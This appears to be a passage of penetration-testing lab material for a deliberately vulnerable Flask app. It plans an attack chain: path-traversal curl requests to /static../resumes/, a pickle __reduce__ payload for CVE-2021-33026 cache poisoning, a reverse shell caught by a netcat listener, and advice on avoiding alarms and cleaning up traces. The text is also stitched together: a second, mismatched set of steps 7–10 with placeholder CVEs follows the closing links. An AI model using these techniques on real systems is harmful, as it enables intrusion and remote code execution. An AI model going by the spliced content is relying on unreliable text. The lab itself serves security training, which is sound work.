# Lab 05 - Vulnerability Analysis and Exploitation Planning

## Objective

Perform deep analysis of the Flask application source code to understand Redis integration, verify resume upload folder accessibility, scan dependencies with `pip-audit-extra` to identify the Flask-Caching CVE-2021-33026 pickle deserialization vulnerability, and plan the exploitation strategy.

## Background

Now that you have complete source code and configuration files, it's time to:
1. Understand exactly how the application uses Redis caching
2. Identify where the Redis server lives and how to access it
3. Verify access to the resume upload folder
4. Scan Python dependencies for known vulnerabilities
5. Focus on Flask-Caching CVE-2021-33026 - a critical pickle deserialization RCE vulnerability

**CVE-2021-33026** affects Flask-Caching versions before 1.10.1 and allows remote code execution through cache poisoning by exploiting unsafe pickle deserialization.

## Prerequisites

### Install pip-audit or pip-audit-extra

```bash
# Install pip-audit
pip install pip-audit

# Or install the enhanced version with extra features
pip install pip-audit-extra

# Alternatively, use pipx for isolated installation
pipx install pip-audit
```

## Steps

### 1. Deep Analysis of app.py - Redis Integration

Open and thoroughly analyze the Flask application:

```bash
cd resumecrunch-analysis
cat app.py
```

**Search for Redis-specific code:**

```bash
# Find all Redis-related imports
grep -n "import.*redis\|from.*redis" app.py

# Find Redis client initialization
grep -n -A 5 "redis.Redis\|Redis(" app.py

# Find Flask-Caching configuration
grep -n -A 5 "Flask.*Caching\|Cache(" app.py

# Find cache decorators
grep -n "@cache" app.py

# Find manual cache operations
grep -n "cache.set\|cache.get\|cache.delete" app.py
```

### 2. Locate the Redis Server Connection Details

Extract the exact Redis connection configuration:

```bash
# Look for Redis connection strings or configuration
grep -B 2 -A 5 "redis://" app.py
grep -B 2 -A 5 "CACHE_REDIS" app.py
grep -B 2 -A 5 "redis_client" app.py
```

**Document the Redis configuration:**

```bash
cat > redis-connection-analysis.txt << 'EOF'
=== Redis Connection Analysis from app.py ===

## Connection Method
(Example - extract from actual code)

Option 1: Direct Redis client
```python
import redis
redis_client = redis.Redis(
    host='resume_crunch_redis_container',
    port=6379,
    password='your_password_here',
    db=0,
    decode_responses=True
)
```

Option 2: Flask-Caching with Redis backend
```python
from flask_caching import Cache
cache = Cache(app, config={
    'CACHE_TYPE': 'RedisCache',
    'CACHE_REDIS_URL': 'redis://:password@resume_crunch_redis_container:6379/0'
})
```

## Extracted Details
- Host: resume_crunch_redis_container
- Port: 6379
- Password: [EXTRACTED_PASSWORD]
- Database: 0
- Connection String: redis://:password@resume_crunch_redis_container:6379/0

## Cache Usage Pattern
- Decorator-based: @cache.cached(timeout=300)
- Manual operations: cache.set(key, value), cache.get(key)
- Serialization: Uses pickle (VULNERABLE!)
EOF
```

### 3. Identify How Cache Keys Are Generated

This is critical for exploitation:

```bash
# Find cache key generation logic
grep -n "cache_key\|make_cache_key" app.py

# Find cached endpoints
grep -B 2 "@cache" app.py
```

**Document caching patterns:**

```bash
cat > cache-pattern-analysis.txt << 'EOF'
=== Cache Usage Patterns ===

Cached Endpoints:
1. /results/<session_id>
   - Cache key: result_{session_id}
   - Timeout: 300 seconds
   - Contains: Analysis results (pickled object)

2. /profile/<user_id>
   - Cache key: profile_{user_id}
   - Timeout: 600 seconds
   - Contains: User profile data (pickled object)

Cache Key Format:
- Predictable: YES/NO
- User-controllable: YES/NO (can we control session_id?)
- Includes session cookie: YES/NO

Serialization:
- Method: pickle.dumps() / pickle.loads()
- Vulnerability: Pickle deserialization RCE (CVE-2021-33026)
EOF
```

### 4. Verify Resume Upload Folder Accessibility

Test if you can access the resumes folder and the files you uploaded in Lab 01:

```bash
# Try to list the resumes directory
curl -v http://localhost:8080/static../resumes/

# Try to access a specific resume you uploaded earlier
# Replace 'sample_resume.txt' with your actual filename
curl http://localhost:8080/static../resumes/sample_resume.txt

# Try to list files (if directory listing is enabled)
curl http://localhost:8080/static../resumes/ | grep -o 'href="[^"]*"'
```

**Document upload folder accessibility:**

```bash
cat > upload-folder-analysis.txt << 'EOF'
=== Resume Upload Folder Analysis ===

Upload Path (from app.py): /app/resumes
Accessible via path traversal: /static../resumes/

Access Test Results:
- Directory listing enabled: YES/NO
- Can view directory contents: YES/NO
- Can download uploaded files: YES/NO
- Files found:
  - sample_resume.txt (ACCESSIBLE/NOT ACCESSIBLE)
  - [list other files]

Upload Functionality:
- Accepts zip files: YES
- Extracts to /app/resumes: YES
- File type validation: (check app.py for validation logic)
- Filename sanitization: (check for path traversal in filenames)

Exploitation Potential:
- Upload malicious file: POSSIBLE
- Access uploaded malicious file: POSSIBLE
- Execute uploaded file: TO BE TESTED (Lab 06)

If we can upload AND access files in /app/resumes/, we can:
1. Upload a reverse shell Python script in a zip file
2. Access it via /static../resumes/reverse_shell.py
3. Use cache poisoning to execute it
EOF
```

### 5. Run pip-audit-extra on requirements.txt

Scan all Python dependencies for known vulnerabilities:

```bash
# Basic scan
pip-audit -r requirements.txt

# Detailed scan with JSON output
pip-audit -r requirements.txt -f json -o vulnerabilities.json

# View results
cat vulnerabilities.json | python3 -m json.tool
```

**Generate a formatted report:**

```bash
# Markdown report
pip-audit -r requirements.txt -f markdown -o vulnerability-report.md

# View the report
cat vulnerability-report.md
```

### 6. Identify Flask-Caching CVE-2021-33026

Look specifically for the Flask-Caching vulnerability:

```bash
# Check Flask-Caching version in requirements.txt
grep -i "flask-caching" requirements.txt

# Search pip-audit results for Flask-Caching
grep -i "flask-caching" vulnerability-report.md

# Search for CVE-2021-33026 specifically
grep "CVE-2021-33026" vulnerabilities.json
```

**Expected finding:**
```
Name: Flask-Caching
Version: 1.10.0 (or earlier)
CVE: CVE-2021-33026
Severity: HIGH
Description: Flask-Caching before 1.10.1 allows remote code execution via cache poisoning
```

### 7. Research CVE-2021-33026 in Detail

Create a detailed vulnerability profile:

```bash
cat > cve-2021-33026-analysis.txt << 'EOF'
=== CVE-2021-33026 - Flask-Caching Pickle Deserialization RCE ===

## Vulnerability Details
- **CVE ID**: CVE-2021-33026
- **Package**: Flask-Caching
- **Affected Versions**: < 1.10.1
- **Current Version**: (from requirements.txt)
- **Severity**: HIGH
- **CVSS Score**: 8.1

## Description
Flask-Caching uses Python's pickle module to serialize cached objects.
If an attacker can control cached data (cache poisoning), they can inject
malicious pickled payloads that execute arbitrary code when unpickled.

## Attack Vector
1. Identify a cached endpoint (e.g., /results/<session_id>)
2. Poison the cache with a malicious pickle payload
3. Trigger cache retrieval (e.g., access /results/<session_id>)
4. The application unpickles the malicious payload
5. Arbitrary code execution occurs

## Exploitation Requirements
- Direct access to Redis (✓ We have this - port 6379)
- Redis authentication credentials (✓ We have password)
- Knowledge of cache key format (✓ Extract from app.py)
- Ability to set cache values (✓ Redis SET command)
- Endpoint that triggers cache retrieval (✓ Identify in app.py)

## Pickle Deserialization Mechanics
When Python unpickles data, it can execute arbitrary code via __reduce__():

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

# When unpickled, this executes: os.system('whoami')
payload = pickle.dumps(RCE())
```

## Attack Plan
1. Connect to Redis with discovered credentials
2. Create malicious pickle payload with reverse shell
3. Identify cached endpoint and cache key format
4. Set malicious payload in Redis cache
5. Trigger cache retrieval via HTTP request
6. Reverse shell executes, giving us RCE

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-33026
- https://github.com/advisories/GHSA-656c-6cxf-hvcv
- Flask-Caching Security Advisory
EOF
```

### 8. Analyze All Other Vulnerabilities

Document all vulnerabilities found by pip-audit:

```bash
cat > all-vulnerabilities-summary.txt << 'EOF'
=== Complete Vulnerability Summary ===

## Critical/High Severity

1. Flask-Caching < 1.10.1 (CVE-2021-33026)
   - Severity: HIGH
   - Impact: Remote Code Execution via cache poisoning
   - Exploitable: YES
   - Priority: IMMEDIATE EXPLOITATION TARGET

## Medium Severity
(List any medium severity vulnerabilities found)

## Low Severity
(List any low severity vulnerabilities found)

## Exploitation Priority
1. CVE-2021-33026 (Flask-Caching) - RCE via cache poisoning
2. (Other high-priority vulns if found)

## Defense Evasion Considerations
When exploiting cache poisoning:
- Use existing cache keys to avoid disrupting app
- Test with benign commands first (whoami, pwd)
- Remove uploaded malicious files after exploitation
- Clean cache entries after successful exploitation
- Avoid setting alarms by not disrupting normal operations
EOF
```

### 9. Create Complete Attack Surface Map

Compile all information for exploitation planning:

```bash
cat > complete-attack-surface.txt << 'EOF'
=== Complete Attack Surface - ResumeCrunch ===

## Entry Points
1. Path Traversal (Nginx)
   - Endpoint: /static../
   - Impact: Full source disclosure + file access
   - Exploited: ✓ Complete

2. Redis Direct Access
   - Port: 6379
   - Authentication: Required (password obtained)
   - Access: Direct TCP connection from localhost
   - Exploited: Not yet (Lab 06)

3. File Upload
   - Endpoint: /upload
   - Accepts: ZIP files
   - Extraction path: /app/resumes
   - Accessible via: /static../resumes/
   - Validation: (check app.py)
   - Exploited: Not yet (Lab 06)

4. Flask-Caching Pickle Deserialization
   - CVE: CVE-2021-33026
   - Cached endpoints: (list from app.py analysis)
   - Cache keys: (format from app.py)
   - Exploited: Not yet (Lab 06)

## Attack Chain for RCE

### Method 1: Upload Reverse Shell + Cache Poisoning
1. Create reverse shell Python script
2. Package in ZIP file with legitimate resume
3. Upload via web interface
4. Verify file accessible at /static../resumes/reverse_shell.py
5. Create pickle payload that executes reverse shell
6. Connect to Redis and poison cache
7. Start netcat listener (nc -l 4444)
8. Trigger cache retrieval
9. Reverse shell connects back

### Method 2: Direct Cache Poisoning (No Upload)
1. Create pickle payload with inline reverse shell
2. Connect to Redis
3. Poison cache with malicious payload
4. Start netcat listener
5. Trigger cache retrieval
6. Reverse shell executes

## Required for Exploitation
✓ Redis host: resume_crunch_redis_container
✓ Redis port: 6379
✓ Redis password: [OBTAINED]
✓ Upload path: /app/resumes
✓ Path traversal access: /static../resumes/
✓ Vulnerable package: Flask-Caching < 1.10.1
✓ Cache key format: (extract from app.py)
☐ Netcat listener ready
☐ Reverse shell payload prepared
☐ Attack script coded

## Testing Without Alarms
To test cache poisoning without disrupting the application:
1. Use a test cache key (e.g., "test_key_12345")
2. Test with benign commands first (whoami, pwd, ls)
3. Verify command execution via output
4. Clean up test keys after verification
5. For production exploit, use existing but expired cache keys
EOF
```

### 10. Plan the Exploitation Carefully

Create a step-by-step exploitation plan for Lab 06:

```bash
cat > exploitation-plan.txt << 'EOF'
=== Exploitation Plan - Lab 06 ===

## Phase 1: Preparation
[ ] Verify Redis connection (nc -zv localhost 6379)
[ ] Test Redis authentication
[ ] Review cache key formats in app.py
[ ] Prepare reverse shell script
[ ] Test file upload functionality

## Phase 2: Test Cache Access (Without Disruption)
[ ] Connect to Redis
[ ] List existing keys (KEYS *)
[ ] Examine key format and values
[ ] Test setting a benign test key
[ ] Test retrieving test key
[ ] Delete test key (cleanup)

## Phase 3: Upload Reverse Shell
[ ] Create reverse_shell.py script
[ ] Package in ZIP with dummy resume
[ ] Upload via web interface
[ ] Verify upload at /static../resumes/reverse_shell.py

## Phase 4: Test Benign Cache Poisoning
[ ] Create benign pickle payload (whoami command)
[ ] Set in Redis with test cache key
[ ] Access endpoint to trigger deserialization
[ ] Verify command execution
[ ] Clean up test data

## Phase 5: Deploy Reverse Shell
[ ] Start netcat listener (nc -l 4444)
[ ] Create malicious pickle payload (reverse shell)
[ ] Set in Redis cache
[ ] Trigger deserialization via HTTP request
[ ] Receive reverse shell connection
[ ] Post-exploitation enumeration

## Phase 6: Cleanup
[ ] Remove reverse shell file from /app/resumes
[ ] Delete malicious cache entries
[ ] Document findings and proof of concept
EOF
```

## Verification Checklist

- [ ] Analyzed app.py for Redis integration points
- [ ] Identified exact Redis connection string and credentials
- [ ] Located where Redis server container is running
- [ ] Documented cache key generation patterns
- [ ] Tested resume upload folder accessibility via /static../resumes/
- [ ] Confirmed ability to access uploaded files
- [ ] Installed pip-audit or pip-audit-extra
- [ ] Ran vulnerability scan on requirements.txt
- [ ] Generated vulnerability reports (JSON and Markdown)
- [ ] Identified Flask-Caching version in use
- [ ] Confirmed CVE-2021-33026 vulnerability present
- [ ] Researched CVE-2021-33026 exploitation techniques
- [ ] Documented all other vulnerabilities found
- [ ] Created complete attack surface map
- [ ] Developed detailed exploitation plan for Lab 06

## Key Findings Summary

### 1. Redis Server Location
- **Container**: resume_crunch_redis_container
- **Port**: 6379 (accessible from localhost)
- **Password**: [OBTAINED from docker-compose.yml or app.py]
- **Database**: 0
- **Connection String**: redis://:password@resume_crunch_redis_container:6379/0

### 2. Resume Upload Folder
- **Path**: /app/resumes
- **Accessible**: YES (via /static../resumes/)
- **Can upload**: YES (ZIP files via web interface)
- **Can retrieve**: YES (via path traversal)

### 3. Critical Vulnerability - CVE-2021-33026
- **Package**: Flask-Caching
- **Version**: < 1.10.1
- **Vulnerability**: Unsafe pickle deserialization
- **Impact**: Remote Code Execution
- **Exploitable**: YES
- **Requirements**: Direct Redis access (✓), known cache keys (✓), trigger endpoint (✓)

### 4. Attack Chain
Path Traversal → Source Disclosure → Credential Extraction → File Upload → Cache Poisoning → Pickle Deserialization → RCE → Reverse Shell

## Questions to Answer

1. What is the exact Redis connection string in app.py?
2. How does the application use Flask-Caching?
3. What cache key format is used?
4. Can you access the /app/resumes folder via path traversal?
5. Can you download files you previously uploaded?
6. What version of Flask-Caching is installed?
7. Is CVE-2021-33026 present?
8. What is the attack vector for this CVE?
9. What are the prerequisites for exploitation?
10. How can you test cache poisoning without disrupting the application?

## Security Impact

**Severity:** CRITICAL

**Vulnerability Chain:**
1. ✓ Nginx Path Traversal (HIGH)
2. ✓ Source Code Disclosure (HIGH)
3. ✓ Credential Exposure (HIGH)
4. ✓ Direct Redis Access (MEDIUM)
5. ✓ Unrestricted File Upload (MEDIUM)
6. ✓ Flask-Caching RCE - CVE-2021-33026 (CRITICAL)

**Combined Impact:** Complete system compromise via Remote Code Execution

## Next Steps

You now have:
- Complete understanding of Redis integration
- Verified access to uploaded files
- Identified critical RCE vulnerability (CVE-2021-33026)
- Detailed exploitation plan

Proceed to [Lab 06 - Redis Cache Poisoning and Reverse Shell](lab-06-redis-exploit.md) to:
1. Test Redis connectivity on port 6379
2. Authenticate with discovered credentials
3. Test benign cache poisoning
4. Upload reverse shell via ZIP file
5. Poison cache to execute reverse shell
6. Set up netcat listener on port 4444
7. Trigger exploitation and receive reverse shell
8. Perform post-exploitation activities

---

[← Previous: Extract Docker Files](lab-04-locate-source.md) | [Next: Redis Exploitation →](lab-06-redis-exploit.md)

Or use the command line:

```bash
# Get CVE details (if you have curl and jq)
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-12345" | jq
```

### 7. Identify Exploitable Vulnerabilities

Document which vulnerabilities are potentially exploitable:

```bash
cat > exploitable-vulns.md << EOF
# Exploitable Vulnerabilities

## High Priority

### CVE-XXXX-XXXX - [Package Name]
- **Severity**: Critical
- **Affected Version**: X.X.X
- **Fixed Version**: Y.Y.Y
- **Exploit Available**: Yes/No
- **Attack Vector**: [Remote/Local]
- **Description**: [Brief description]
- **Exploitation Notes**: [How this could be exploited]

## Medium Priority
[Continue for each vulnerability...]

EOF
```

### 8. Check for Exploit Code

Search for public exploits:

```bash
# Search exploit-db (if installed)
searchsploit [package-name]

# Search GitHub
open "https://github.com/search?q=CVE-XXXX-XXXX+exploit"
```

### 9. Test Vulnerability Scope

Determine which vulnerabilities affect the running application:

```bash
# For each vulnerable package, check if it's actually used
# Review app.py or source code for imports

grep -r "import flask" .
grep -r "import redis" .
grep -r "import werkzeug" .
```

### 10. Create Remediation Plan

Document how to fix each vulnerability:

```bash
cat > remediation-plan.md << EOF
# Vulnerability Remediation Plan

## Immediate Actions (Critical/High)

1. **Flask X.X.X → Y.Y.Y**
   - CVE: CVE-XXXX-XXXX
   - Command: \`pip install Flask==Y.Y.Y\`
   - Impact: [Describe impact on application]

2. **Redis X.X.X → Y.Y.Y**
   - CVE: CVE-XXXX-XXXX
   - Command: \`pip install redis==Y.Y.Y\`
   - Impact: [Describe impact on application]

## Long-term Actions (Medium/Low)
[Continue...]

EOF
```

## Advanced Analysis

### Check for Transitive Dependencies

Some vulnerabilities exist in dependencies of your dependencies:

```bash
# Install packages in a virtual environment
python3 -m venv test-env
source test-env/bin/activate
pip install -r requirements.txt

# Audit the entire environment
pip-audit

deactivate
```

### Compare with CVE Databases

Cross-reference with other databases:

```bash
# Check MITRE CVE database
# Check Snyk vulnerability DB
# Check GitHub Advisory Database
```

### Test for Proof-of-Concept Exploits

If a vulnerability has a PoC exploit available:

```bash
# Document the exploit steps
# Test in a controlled environment
# Verify the vulnerability is actually exploitable in this context
```

## Sample Output Analysis

Expected `pip-audit` output might look like:

```
Name    Version ID               Fix Versions
------- ------- ---------------- ------------
Flask   2.0.1   PYSEC-2023-0001  2.0.2,2.1.0
redis   3.5.3   PYSEC-2023-0123  4.0.0
```

**Analysis questions:**
1. What is the vulnerability?
2. How severe is it?
3. Is it remotely exploitable?
4. Does it affect the functionality used in this app?
5. Is there a PoC exploit available?

## Verification

- [ ] Successfully installed pip-audit
- [ ] Scanned requirements.txt for vulnerabilities
- [ ] Identified all CVEs
- [ ] Researched high-severity vulnerabilities
- [ ] Documented exploitable vulnerabilities
- [ ] Created remediation plan

## Expected Findings

You should discover:
- Multiple outdated packages
- Several CVEs with varying severity levels
- At least one critical or high-severity vulnerability
- Potential exploit paths for the next lab

## Red Flags to Look For

Pay special attention to vulnerabilities in:
- **Web frameworks** (Flask, Werkzeug) - RCE potential
- **Serialization libraries** (pickle, PyYAML) - Code execution
- **Redis client** - Command injection, cache poisoning
- **Template engines** (Jinja2) - SSTI vulnerabilities

## Next Steps

With your vulnerability analysis complete, proceed to [Lab 06 - Poison Redis Cache](lab-06-redis-exploit.md) to exploit a cache poisoning vulnerability and deploy a reverse shell.

---

[← Previous: Locate Source Code](lab-04-locate-source.md) | [Next: Redis Cache Poisoning →](lab-06-redis-exploit.md)
